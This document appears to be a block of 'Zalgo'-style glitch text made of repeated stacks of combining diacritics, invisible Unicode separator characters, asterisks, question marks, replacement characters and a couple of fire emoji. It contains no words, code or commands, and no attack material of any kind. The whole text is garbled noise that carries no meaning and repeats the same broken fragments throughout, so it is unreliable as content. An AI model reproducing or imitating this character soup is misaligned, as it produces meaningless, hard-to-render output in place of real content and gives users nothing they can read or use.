⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̇̊͆̈̊̏͊̇̐̀̽̿͝͝